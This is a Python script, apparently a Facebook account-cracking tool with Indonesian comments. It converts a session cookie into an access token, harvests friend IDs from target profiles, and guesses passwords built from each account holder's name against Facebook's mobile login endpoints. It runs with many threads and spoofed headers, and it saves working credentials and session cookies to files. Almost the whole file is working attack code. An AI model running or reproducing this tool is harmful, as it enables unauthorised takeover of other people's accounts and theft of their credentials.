'''Source Code 2023'''
'''Created By Raka Andrian Tara'''
'''Github Bajingan-Z'''
# * [ MODULE PERTAMA / KEBUTUHAN ] * #
import os,sys,random,json,re
try:
	from os import system as __cape_anjink__
	try:
		from time import sleep as __raka__
		try:
			from datetime import datetime as det
		except:pass
	except:pass
except:pass
try:
	import requests
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tread
except:
	__raka_andrian___(f" [*] sedang menginstall bahan module ")
	__cape_anjink__(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures stdiomask")
	exit(f" [*] silahkan run kembali script nya. ")
#  + [ WARNA PRINT 1 ] + #
P = '\x1b[1;97m' #Putuh Tebal
M = '\x1b[1;31m' #Merah Tebal
H = '\x1b[1;32m' #Hijau Tebal
K = '\x1b[1;33m' #Kuning Tebal
B = '\x1b[1;34m' #Biru Tebal
U = '\x1b[1;35m' #Ungu Tebal
O = '\x1b[1;36m' #Oren Tebal
N = '\x1b[0m' #Warna Mati Tebal
Z = "\033[1;30m" #Abu Tebal
FM = '\033[0;41m' #Random Warna
#  + [ WARNA PRINT 2 ] + #
p = "\x1b[0;97m" # Putih
m = "\x1b[0;91m"# Merah
h = "\x1b[0;92m" # Hijau
k = "\x1b[0;93m" # Kuning
b = "\x1b[0;94m" # Biru
u = "\x1b[0;95m" # Ungu
o = "\x1b[0;96m" # Biru Muda
n = "\033[0m" # Warna Mati
raka27 = random.choice(['\x1b[1;92m','\x1b[1;93m'])
# * [ CONVERT TANGGAL ] * #
convert = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = det.now().day
bln = convert[(str(det.now().month))]
thn = det.now().year
# * [ NOTE TANGGAL HARI INI ] * #
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
# * [ STRING APPEND ] * #
id, id2, uap, raka_andrian_tara, king_off_raka = [],[],[],[],[]
tambahan, ubah, raka = [],[],0
keras, metode, ok, cp = [],[],0,0
'''Klo Hasil Kuning Ganti Disini'''
# * [ USERAGENT RANDOM ] * #
for meki in range(5000):
	negara = random.choice(["id_ID","en_US","en_GB","it_IT"])
	rc = random.choice; rr = random.randint
	raka1 = f"Mozilla/5.0 (Linux; U; Android 11; zh-CN; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/{str(rr(10,90))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1000,1900))} Mobile Safari/537.36"
	if raka1 in uap:pass
	else:uap.append(raka1)
	raka2 = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,113))}.0.{str(rr(4100,4900))}.{str(rr(40,113))} Mobile Safari/537.36 Instagram {str(rr(210,380))}.1.0.{str(rr(10,300))}.{str(rr(100,120))} Android (30/11; 300dpi; {str(rr(100,999))}x{str(rr(100,2000))}; samsung; SM-A125F; a12; mt6765; {negara}; 333717262)"
	if raka2 in uap:pass
	else:uap.append(raka2)
# * [  ] * #
logoku = f"""   {M}	       ________        _____.__ {P}®
 •{M}GENERASI    /  _____/_____ _/ ____\__|  
{P} •{M}AKUN       /   \  ___\__  \\   __\ |  |  
{P} •{K}FACEBOOK   \    \_\  \/ __ \|  |  |  |  
{P} •{K}INDONESIA   \______  (____  /__|  |__| {P}V2{K}
                     \/     \/         {M} \n _______________________________________________________{P}\n"""
# * [  ] * #
def login_cookies():
	os.system("clear")
	cookie_anda = input(" [?] cookie : ")
	ses = requests.Session()
	try:
		ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop('content-type')
		ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
		response2 = ses.get(verification_url, cookies = {'cookie': cookie_anda}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			__raka_andrian___(" [!] cookie anda invalid ")
			exit()
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
			ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie_anda})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop('content-type');ses.headers.pop('origin')
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie_anda}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie_anda}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop('content-type');ses.headers.pop('origin')
				ses.headers.update({'referer': 'https://m.facebook.com/',})
				response6 = ses.get(windows_referer, cookies = {'cookie': cookie_anda}).text
				if "Sukses!" in str(response6):
					ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
					response7 = ses.get(status_url, cookies = {'cookie': cookie_anda}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					__raka_andrian___(" [√] cookie anda valid ")
					__raka__(2)
					open("cookie.txt","w").write(cookie_anda);open("token.txt","w").write(access_token);menu("Aku Sayang Bat Sama Elga")
				else:
					__raka_andrian___(" [!] kesalahan saat convert token ")
					exit()
	except (ConnectionError, ChunkedEncodingError):
		__raka_andrian___(" [!] sinyal anda bermasalah ")
		exit()
# * [ MENU UTAMA SIMPLE BF ] * #
def menu(RakaAndrianTara):
	try:
		cookie = {"cookie":open("cookie.txt","r").read()}
		token = open("token.txt","r").read()
		raka_xyz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
		elga = json.loads(raka_xyz.text)
		raka = elga["name"]
		andrian = elga["id"]
	except KeyError:
		__cape_anjink__("rm -rf token.txt && rm -rf cookie.txt")
		menanyakanHal("Sehat Kan Sayang")
	print(logoku)
	__raka_andrian___(" [*] nama : {}".format(raka))
	__raka_andrian___(" [*] id  : {}".format(andrian))
	print()
	__raka_andrian___(" [1] crack massal publik")
	__raka_andrian___(" [2] crack massal files  (without login)")
	print()
	ngaran_aink_raka = input(" [?] pilih : ")
	if ngaran_aink_raka in ["1"]:
		__raka_andrian___(" [*] gunakan tanda (,) untuk menambahkan id. ")
		__aink_raka__ = input(" [?] masukan id : ").split(",")
		for rakatara in __aink_raka__:
			try:
				raka_tara = requests.Session().get(f"https://graph.facebook.com/{rakatara}?fields=friends.limit(9999999)&access_token={token}",cookies=cookie).json()
				for x in raka_tara["friends"]["data"]:
					id.append(x["id"]+"|"+x["name"])
					fr = random.choice([O,B,H,P,K,M,U])
					sys.stdout.write("\r{} [*] sedang dump : {}{} ".format(P,fr,x["id"]));sys.stdout.flush();__raka__(0.00040)
			except (KeyError,IOError):
				exit("\n [!] target tidak publik")
		print('\n %s[•] total yang terkumpul %s%s '%(P,K,str(len(id))))
		tanyakan("Keseringan Ngentod Ayam Ya Gitu:v")
	else:
		exit()
# * [  ] * #
def krekBerfile(ModalIdKontol):
	try:
		limit = int(input(f" [?] masukan total files : "))
	except:
		limit = 1
	for tolol in range(limit):
		try:
			file = input("\n [?] {}. masukan files : ".format(tolol+1))
			kanjud = open(file,"r").readlines()
			for mek in kanjud:
				id.append(mek)
				sys.stdout.write("\r [*] sedang dump id : {}".format(len(id)));sys.stdout.flush();__raka__(0.00090)
		except FileNotFoundError:
			__raka_andrian___(" [!] nama file {} tidak ada ".format(file));exit()
	print("\r {}[*] berhasil mengumpulkan {} id ".format(P,len(id)))
	tanyakan("Sakarepmu Anjing")
# * [ ] * #
def tanyakan(KaloAdaBugBisaDitanyakanBang):
	for kocakin in id:id2.insert(0,kocakin)
	__raka_andrian___(f"\n{P} [1] m.facebook")
	__raka_andrian___(" [2] mbasic.facebook")
	__raka_andrian___(" [3] free.facebook")
	raka_andrian = input(" [?] pilih : ")
	if raka_andrian in ["1"]:metode.append("m.facebook")
	elif raka_andrian in ["2"]:metode.append("mbasic.facebook")
	elif raka_andrian in ["3"]:metode.append("free.facebook")
	pusing_anjink = input(" [?] ingin menambahkan password tambahan y/t : ")
	if pusing_anjink in ["y"]:
		raka_andrian_tara.append('ya')
		perikod_setan = input("\n [*] enter password : ")
		perikod_anjink=perikod_setan.split(",")
		for sia_anjink in perikod_anjink:
			king_off_raka.append(sia_anjink)
	else:
		raka_andrian_tara.append('no')
	listPassword("Apasih Yang Gak Buat Kamu")
# * [ ] * #
def listPassword(SourceByRakaAndrian):
	__cape_anjink__("clear");print(logoku)
	__raka_andrian___('  %s•••%s TOTAL YANG TERKUMPUL DARI USERT IDZ %s[ %s%s %s] •••'%(Z,P,Z,K,str(len(id)),Z))
	__raka_andrian___(f'{M} _______________________________________________________\n')
	with tread(max_workers=30) as RakaEXDE:
		for raka_sayang_elga in id2:
			try:
				raka_elga = []
				uiz = raka_sayang_elga.split("|")[0]
				nama = raka_sayang_elga.split("|")[1]
				depan = nama.split(" ")[0]
				if len(nama)<=5:
					if len(depan)<3:
						pass 
					else:
						raka_elga.append(depan+"123");raka_elga.append(depan+"1234567");raka_elga.append(depan+"321");raka_elga.append(depan+"0"+str(rr(1,9)))
				else:
					if len(depan)<3:
						raka_elga.append(nama)
					else:
						raka_elga.append(nama);raka_elga.append(depan+"123");raka_elga.append(depan+"12345");raka_elga.append(depan+"1234");raka_elga.append(depan+"1"+str(rr(1,9)))
					belakang = nama.split(" ")[1]
					if len(belakang)<3:
						raka_elga.append(depan+belakang)
					else:
						raka_elga.append(depan+belakang);raka_elga.append(depan+belakang+"123");raka_elga.append(belakang+"1234");raka_elga.append(belakang+"123456");raka_elga.append(belakang+"2"+str(rr(1,9)))
				if "ya" in raka_andrian_tara:
					for sia_anjink in king_off_raka:
						raka_elga.append(sia_anjink)
				else:pass
				if "m.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"m.prod.facebook.com")
				elif "mbasic.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"mbasic.prod.facebook.com")
				elif "free.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"free.prod.facebook.com")
				else:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"m.prod.facebook.com")
			except:
				if "m.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"m.prod.facebook.com")
				elif "mbasic.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"mbasic.prod.facebook.com")
				elif "free.facebook" in metode:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"free.prod.facebook.com")
				else:RakaEXDE.submit(methode_raka_xyz,uiz,raka_elga,"m.prod.facebook.com")

	print('\n')
	print(f'{P} [•] %s \n{P} [•] %s'%(okz,cpz))
	print('')
	print(f'{P} [•] OK : {H}%s '%(ok))
	print(f'{P} [•] CP : {K}%s '%(cp))
	print('')
# * [ ] * #
def methode_raka_xyz(uiz,raka_elga,url):
	global ok,cp,raka
	ses = requests.Session()
	ua = random.choice(uap)
	rr = random.randint
	bahasa = random.choice(["aa_DJ","aa_ER","aa_ET","af_ZA","am_ET","an_ES","ar_AE","ar_BH","ar_DZ","ar_EG","ar_IN","ar_IQ","ar_JO","ar_KW","ar_LB","ar_LY","ar_MA","ar_OM","ar_QA","ar_SA","ar_SD","ar_SY","ar_TN","ar_YE","as_IN","ast_ES","az_AZ","be_BY","ber_DZ","ber_MA","bg_BG","bn_BD","bn_IN","bo_CN","bo_IN","br_FR","bs_BA","byn_ER","ca_AD","ca_ES","ca_FR","ca_IT","crh_UA","cs_CZ","csb_PL","cy_GB","da_DK","de_AT","de_BE","de_CH","de_DE","de_LI","de_LU","dv_MV","dz_BT","el_CYel_GR","en_AG","en_AU","en_BW","en_CA","en_DK","en_GB","en_HK","en_IE","en_IN","en_NG","en_NZ","en_PH","en_SG","en_US","en_ZA","en_ZW","eo_EO","es_AR","es_BO","es_CL","es_CO","es_CR","es_DO","es_EC","es_ES","es_GT","es_HN","es_MX","es_NI","es_PA","es_PE","es_PR","es_PY","es_SV","es_US","es_UY","es_VE","et_EE","eu_ES","eu_FR","fa_IR","fi_FI","fil_PH","fo_FO","fr_BE","fr_CA","fr_CH","fr_FR","fr_LU","fur_IT","fy_DE","fy_NL","ga_IE","gd_GB","gez_ER","gez_ET","gl_ES","gu_IN","gv_GB","ha_NG","he_IL","hi_IN","hne_IN","hr_HR","hsb_DE","ht_HT","hu_HU","hy_AM","ia_IA","id_ID","ig_NG","ik_CA","is_IS","it_CH","it_IT","iw_IL","ja_JP","ka_GE","kk_KZ","kl_GL","km_KH","kn_IN","ko_KR","ks_IN","ku_TR","kw_GB","ky_KG","lg_UG","li_BE","li_NL","lo_LA","lt_LT","lv_LV","mai_IN","mg_MG","mi_NZ","mk_MK","ml_IN","mn_MN","mr_IN","ms_MY","mt_MT","my_MM","nb_NO","nds_DE","nds_NL","ne_NP","nl_AW","nl_BE","nl_NL","nn_NO","no_NO","nr_ZA","nso_ZA","oc_FR","om_ET","om_KE","or_IN","pa_IN","pa_PK","pap_AN","pl_PL","ps_AF","pt_BR","pt_PT","ro_RO","ru_RU","ru_UA","rw_RW","sa_IN","sc_IT","sd_IN","se_NO","shs_CA","si_LK","sid_ET","sk_SK","sl_SI","so_DJ","so_ET","so_KE","so_SO","sq_AL","sr_CS","sr_ME","sr_RS","sr_YU","ss_ZA","st_ZA","sv_FI","sv_SE","ta_IN","te_IN","tg_TJ","th_TH","ti_ER","ti_ET","tig_ER","tk_TM","tl_PH","tn_ZA","tr_CY","tr_TR","ts_ZA","tt_RU","ug_C","uk_UA","ur_PK","uz_UZ","ve_ZA","vi_VN","wa_BE","wo_SN","xh_ZA","yi_US","yo_NG","zh_CN","zh_HK","zh_SG","zh_TW","zu_ZA"])
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	xxv = "com.android.chrome"
	sys.stdout.write(f"\r {Z}[{'{:.1%}'.format(raka/int(len(id2)))}{Z}] [{H}{raka}{P}-{M}{len(id2)}{Z}] [{H}{ok}{P}-{K}{cp}{Z}] \r"),
	sys.stdout.flush()
	for pw in raka_elga:
		pw = pw.lower()
		try:
			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(memek.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(memek.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': uiz,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(memek.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(memek.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(memek.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=3446862972255280&kid_directed_site=0&app_id=3446862972255280&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": AinkRaka}
			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print("\r{}[CP] {}{}{}|{}{}{}|{}{} \n".format(P,K,uiz,P,K,pw,P,K,ua))
				open("CP/"+cpz,"w").write(uiz+"|"+pw+"\n");cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r{}[OK] {}{}{}|{}{}{}|{}{} \n".format(P,H,uiz,P,H,pw,P,H,kuki))
				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+ua+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:__raka__(31)
	raka+=1
# * [ ] * #
def menanyakanHal():
	awokawok = input("\n [!] cookie anda kadaluarsa.\n [?] apakah anda ingin crack berfiles y/t : ")
	if awokawok in ["y"]:krekBerfile("Kanjud Sia Hideng")
	else:__raka__(3);loginCookies("Ksabar Bang")
# * [ ] * #
def __raka_andrian___(rakaxxx):
		for e in rakaxxx + "\n":sys.stdout.write(e);sys.stdout.flush();__raka__(0.007)
# * [ ] * #
if __name__ in "__main__":
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass
	__cape_anjink__("clear")
	menu("Created By Raka Andrian Tara Jan Disebar Ya Cape Aink Bikin Na")